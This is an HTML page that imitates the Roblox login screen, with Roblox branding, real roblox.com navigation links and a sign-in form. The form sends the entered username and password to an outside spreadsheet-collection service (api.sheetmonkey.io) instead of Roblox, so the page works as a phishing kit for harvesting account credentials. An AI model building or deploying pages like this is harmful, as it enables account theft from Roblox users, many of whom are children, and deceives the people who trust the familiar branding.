<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Login to your Roblox account or sign up to create a new account.">
    <link  rel="stylesheet" href="styles.css">
    <meta name="keywords" content="Roblox, Login, Robux">
    <meta name="Author" content="Muhsin Abdirizak">
    <title>Log in to Roblox</title>
    <!-- Add favicon here -->
    <link rel="shortcut icon" href="Roblox_Player_2019.png" type="image/x-icon">
</head>
<body>
    <header>
        <nav class="flex-container">
            <div class="logo">
                <img src="Roblox_Player_2019.png" alt="Roblox Logo" height="30px">
            </div>
            <ul class="nav-links">
                <li><a href="https://www.roblox.com/discover#/">Discover</a></li>
                <li><a href="https://www.roblox.com/catalog?Category=1&salesTypeFilter=1">Marketplace</a></li>
                <li><a href="https://create.roblox.com/">Create</a></li>
                <li><a href="https://www.roblox.com/upgrades/robux?ctx=nav">Robux</a></li>
            </ul>
            <input type="text" placeholder="Search" class="search-input" id="Search">
            <a href="https://www.roblox.com/CreateAccount"><button id="sig">Sign up</button></a>
        </nav>
    </header>
    <main>
        <form action="https://api.sheetmonkey.io/form/baRhck1GSZK5zNmHQpM13c" method="POST">
            <h2>Login in to Roblox</h2>
            <div>
                <input type="text" id="username" name="username" required placeholder="Username/Email/Phone">
            </div>
            <div>
                <input type="password" id="password" name="password" required placeholder="Password">
            </div>
            <div>
            <button type="submit">Login</button>
        </div>
            <div>
                <a href="https://www.roblox.com/login/forgot-password-or-username" class="b" id="d" >Forgot Password?</a><br><hr>
            </div>
            <div>
                <button type="button">Email me a one-time code</button>
            </div>
            <div>
                <button type="button">Use another device</button>
            </div>
            <div>
            <a href="https://www.roblox.com/" class="b" id="c">Don't have an account?   <b>Sign up</b></a>
            </div>
        </form>
    </main>
    <footer>

    </footer>
</body>
</html>
